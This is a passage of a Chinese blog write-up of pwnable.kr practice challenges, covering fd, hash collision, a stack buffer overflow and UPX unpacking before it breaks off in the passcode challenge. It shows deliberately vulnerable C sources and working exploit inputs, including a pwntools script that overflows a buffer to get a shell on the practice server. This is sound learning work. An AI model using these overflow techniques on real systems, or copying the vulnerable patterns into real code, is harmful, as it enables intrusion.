<!doctype html><html lang=zh dir=ltr class=scroll-smooth data-default-appearance=light data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="zh"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><title>Pwnable.kr Toddler's Bottle 练习记录 &#183; Lab on Mercury</title><meta name=title content="Pwnable.kr Toddler's Bottle 练习记录 &#183; Lab on Mercury"><meta name=description content="Lab on Mercury"><link rel=canonical href=https://blog.sigmerc.top/posts/pwnkr-toddler/><link type=text/css rel=stylesheet href=/css/main.bundle.min.32ddf7dee8011260365c3436dd92254eeda3ec27bea2822527e6cb67f6ede1ff17904557445f0f6747a03b5aa59bbf754e43fc9b0c77b1cd957ef7061fd0c6d2.css integrity="sha512-Mt333ugBEmA2XDQ23ZIlTu2j7Ce+ooIlJ+bLZ/bt4f8XkEVXRF8PZ0egO1qlm791TkP8mwx3sc2VfvcGH9DG0g=="><script type=text/javascript src=/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1+ko+UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.15ae6e2c9b1ac24a9ccf40003fa689efb1a18db1ee9b73d780b01a6c31b150441415862513e93184f68fe385759e4698b8763cba6a0f79493c1fed99ad5868d4.js integrity="sha512-Fa5uLJsawkqcz0AAP6aJ77GhjbHum3PXgLAabDGxUEQUFYYlE+kxhPaP44V1nkaYuHY8umoPeUk8H+2ZrVho1A==" data-copy=Copy data-copied=Copied></script>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="Pwnable.kr Toddler's Bottle 练习记录"><meta property="og:description" content="画风很可爱的 Pwn 题练习网站。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/posts/pwnkr-toddler/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-10-09T21:19:11+00:00"><meta property="article:modified_time" content="2022-06-23T14:51:02+08:00"><meta property="og:site_name" content="Lab on Mercury"><meta name=twitter:card content="summary"><meta name=twitter:title content="Pwnable.kr Toddler's Bottle 练习记录"><meta name=twitter:description content="画风很可爱的 Pwn 题练习网站。"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Pwnable.kr Toddler\u0027s Bottle 练习记录","headline":"Pwnable.kr Toddler\u0027s Bottle 练习记录","abstract":"\u003cp\u003e画风很可爱的 Pwn 题练习网站。\u003c\/p\u003e","inLanguage":"zh","url":"https:\/\/blog.sigmerc.top\/posts\/pwnkr-toddler\/","author":{"@type":"Person","name":"Mercury"},"copyrightYear":"2019","dateCreated":"2019-10-09T21:19:11\u002b00:00","datePublished":"2019-10-09T21:19:11\u002b00:00","dateModified":"2022-06-23T14:51:02\u002b08:00","keywords":["Linux","C/C++","ARM","整数溢出","栈漏洞","堆漏洞"],"mainEntityOfPage":"true","wordCount":"4684"}]</script><meta name=author content="Mercury"><link href=mailto:signormercurio@gmail.com rel=me><link href=https://github.com/SignorMercurio rel=me><link href=https://t.me/m9r_at_tG rel=me></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0" href=#main-content><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden"><nav class="flex justify-between"><div><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentcolor" d="M112.1 454.3c0 6.297 1.816 12.44 5.284 17.69l17.14 25.69c5.25 7.875 17.17 14.28 26.64 14.28h61.67c9.438.0 21.36-6.401 26.61-14.28l17.08-25.68c2.938-4.438 5.348-12.37 5.348-17.7L272 415.1H112L112.1 454.3zM191.4.0132C89.44.3257 16 82.97 16 175.1c0 44.38 16.44 84.84 43.56 115.8 16.53 18.84 42.34 58.23 52.22 91.45.0313.25.0938.5166.125.7823h160.2c.0313-.2656.0938-.5166.125-.7823 9.875-33.22 35.69-72.61 52.22-91.45C351.6 260.8 368 220.4 368 175.1 368 78.61 288.9-.2837 191.4.0132zM192 96.01c-44.13.0-80 35.89-80 79.1.0 9.69-7.2 16.89-16 16.89S80 184.8 80 176c0-61.76 50.25-111.1 112-111.1 8.844.0 16 7.159 16 16S200.8 96.01 192 96.01z"/></svg></span><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" rel=me href=/>Lab on Mercury</a></div><ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row"><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts>文章</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/categories/ title=Categories>分类</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>标签</a></li><li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></li></ul></nav></header><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Lab on Mercury</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/pwnkr-toddler/>Pwnable.kr Toddler's Bottle 练习记录</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Pwnable.kr Toddler's Bottle 练习记录</h1><div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2019-10-09 21:19:11 +0000 UTC">2019-10-09</time><span class="px-2 text-primary-500">&#183;</span><time datetime="2022-06-23 14:51:02 +0800 +0800">Updated: 2022-06-23</time></div><div class="my-1 text-xs text-neutral-500 dark:text-neutral-400"><a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">二进制安全</a>
<a href=/tags/linux/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">Linux</a>
<a href=/tags/c/c++/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">C/C++</a>
<a href=/tags/arm/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">ARM</a>
<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">整数溢出</a>
<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">栈漏洞</a>
<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/ class="px-1 py-[1px] border rounded-md border-neutral-200 dark:border-neutral-600 hover:border-primary-300 hover:text-primary-700 dark:hover:border-primary-600 dark:hover:text-primary-400">堆漏洞</a></div></div></header><section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert"><div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last"><div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden"><details open class="mt-0 sideNav rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block sticky top-0 py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">Table of Contents</summary><div class="py-2 pr-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#fd>fd</a></li><li><a href=#collision>collision</a></li><li><a href=#bof>bof</a></li><li><a href=#flag>flag</a></li><li><a href=#passcode>passcode</a></li><li><a href=#random>random</a></li><li><a href=#input>input</a></li><li><a href=#leg>leg</a></li><li><a href=#mistake>mistake</a></li><li><a href=#shellshock>shellshock</a></li><li><a href=#coin1>coin1</a></li><li><a href=#blackjack>blackjack</a></li><li><a href=#lotto>lotto</a></li><li><a href=#cmd1>cmd1</a></li><li><a href=#cmd2>cmd2</a></li><li><a href=#uaf>uaf</a></li><li><a href=#memcpy>memcpy</a></li><li><a href=#asm>asm</a></li><li><a href=#unlink>unlink</a></li><li><a href=#blukat>blukat</a></li><li><a href=#horcruxes>horcruxes</a></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><figure><img class="my-0 rounded-md" src=0.jpg alt=featuredImage></figure><p>画风很可爱的 Pwn 题练习网站。</p><h2 id=fd class="relative group">fd <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#fd aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=o>&lt;</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;pass argv[1] a number</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)</span> <span class=o>-</span> <span class=mh>0x1234</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nf>strcmp</span><span class=p>(</span><span class=s>&#34;LETMEWIN</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;good job :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;learn about Linux file IO</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>这里需要传入一个命令行参数，用它减去 <code>0x1234</code> 后得到 <code>fd</code> 也就是 Linux 下的文件描述符，并读取对应的文件到 <code>buf</code> 中。我们当然可以创建一个文件，但是控制其 fd 比较麻烦；但我们知道，Linux 下标准输入流也有自己的 fd，即 0。因此我们只需要传入 <code>0x1234</code> 的十进制形式 <code>4660</code>，并在标准输入中输入 <code>LETMEWIN\n</code> 即可：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./fd <span class=m>4660</span>
</span></span><span class=line><span class=cl>LETMEWIN
</span></span></code></pre></div><h2 id=collision class="relative group">collision <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#collision aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>hashcode</span> <span class=o>=</span> <span class=mh>0x21DD09EC</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>check_password</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>p</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span><span class=o>*</span> <span class=n>ip</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>res</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>5</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>res</span> <span class=o>+=</span> <span class=n>ip</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>argc</span><span class=o>&lt;</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;usage : %s [passcode]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nf>strlen</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>!=</span> <span class=mi>20</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;passcode length should be 20 bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>hashcode</span> <span class=o>==</span> <span class=nf>check_password</span><span class=p>(</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=p>)){</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;wrong passcode.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>首先要求输入 20 字节的密码（显然是个 <code>char *</code>），然后将它强制转换为 <code>int *</code> 类型。我们知道，一个 <code>char</code> 是 1 字节，而一个 <code>int</code> 是 4 字节，因此 20 字节的 <code>char</code> 数组会变成 5 个 <code>int</code> 组成的 <code>int</code> 数组。</p><p>这 5 个 <code>int</code> 会被累加，然后要求其和等于 <code>hashcode</code>。换而言之随便找 5 个加起来等于 <code>hashcode</code> 的十六进制数就行了：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python -c <span class=s1>&#39;print hex(0x21dd09ec-0x01010101*4)&#39;</span>
</span></span><span class=line><span class=cl>0x1dd905e8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ ./col <span class=k>$(</span>python -c<span class=s1>&#39;print &#34;\xe8\x05\xd9\x1d&#34;+&#34;\x01&#34;*16&#39;</span><span class=k>)</span>
</span></span></code></pre></div><p>注意默认小端法表示。</p><h2 id=bof class="relative group">bof <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#bof aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>void</span> <span class=nf>func</span><span class=p>(</span><span class=kt>int</span> <span class=n>key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>overflowme</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;overflow me :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>gets</span><span class=p>(</span><span class=n>overflowme</span><span class=p>);</span>    <span class=c1>// smash me!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=n>key</span> <span class=o>==</span> <span class=mh>0xcafebabe</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Nah..</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=nf>func</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>从 IDA 中观察到 <code>overflowme</code> 在 <code>ebp-2c</code>，而 <code>key</code> 在 <code>ebp+8</code>，相差 <code>0x34</code>。栈上大概是这样的：</p><pre tabindex=0><code> HIGH ADDRESS
 ----------------------
| the states of main() | // caller
 ----------------------
| args of func()       | // including key. Also in caller&#39;s state
 ----------------------
| retaddr of func()    |
 ----------------------
| saved ebp            | &lt;- ebp
 ----------------------
| local vars of func() | // including overflowme[]
 ----------------------  &lt;- esp
 LOW ADDRESS
</code></pre><p>了解这些后，我们用 <code>0x34</code> 字节数据作填充，然后用 <code>0xcafebabe</code> 覆盖掉 <code>key</code> 即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># p = process(&#39;./bof&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x34</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xcafebabe</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h2 id=flag class="relative group">flag <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#flag aria-label=锚点>#</a></span></h2><p>在 Hex-View 中发现是 UPX 加壳的，<code>upx -d</code> 脱壳。</p><p>脱壳后的程序提示会 <code>malloc</code> 然后 <code>strcpy</code> 本题的 flag，查看汇编代码，发现这里 flag 的变量名是 <code>cs:flag</code>，跟踪变量得到 flag。</p><h2 id=passcode class="relative group">passcode <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#passcode aria-label=锚点>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>login</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>passcode2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode1 :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdin</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;enter passcode2 :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=n>passcode2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;checking...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>passcode1</span><span class=o>==</span><span class=mi>338150</span> <span class=o>&amp;&amp;</span> <span class=n>passcode2</span><span class=o>==</span><span class=mi>13371337</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Login OK!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Login Failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>welcome</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>name</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
